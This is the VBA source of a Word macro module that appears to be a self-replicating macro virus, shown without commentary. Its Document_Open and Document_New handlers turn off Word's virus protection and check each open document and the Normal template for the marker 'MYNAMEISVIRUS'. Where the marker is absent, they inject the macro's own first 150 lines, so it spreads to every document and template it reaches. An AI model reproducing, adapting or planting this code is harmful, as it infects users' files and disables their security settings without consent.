   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Close()
       Dim stato As Boolean
       Dim flagaltro As Boolean
       Dim flagio As Boolean
       Dim count As Integer
       Dim stress As String
       Dim bry As Variant

       On Error Resume Next
   End Sub
   Private Sub Document_New()
   '
   Dim aready As Boolean
   Dim star As Long
   Dim send As Long
   Dim answer As String
   Dim path$
    Options.VirusProtection = False
    answer = ""
   star = 1
   send = 1
   path$ = Options.DefaultFilePath(wdUserTemplatesPath)
   If count <> 1 Then
     count = count + 1
    ' Documents.Add
   End If
   If Documents.count <> 0 Then
   For i = 1 To Documents.count
   For Each xitem In Documents(i).VBProject.VBComponents
      ' If xitem.Name = "NewMacros" Then
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If
       End If
   Next
   Next
   End If
     For Each xitem In NormalTemplate.VBProject.VBComponents
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If

       End If
   Next
   End Sub

   Private Sub Document_Open()
   Dim aready As Boolean
   Dim star As Long
   Dim send As Long
   Dim answer As String
   Dim path$
    answer = "MYNAMEISVIRUS"
     Options.VirusProtection = False
   star = 1
   send = 1
   path$ = Options.DefaultFilePath(wdUserTemplatesPath)
   If count <> 1 Then
     count = count + 1
    ' Documents.Add
   End If
   If Documents.count <> 0 Then
   For i = 1 To Documents.count
   For Each xitem In Documents(i).VBProject.VBComponents
      ' If xitem.Name = "NewMacros" Then
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If
       End If
   Next
   Next
   End If
     For Each xitem In NormalTemplate.VBProject.VBComponents
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If

       End If
   Next
   End Sub




























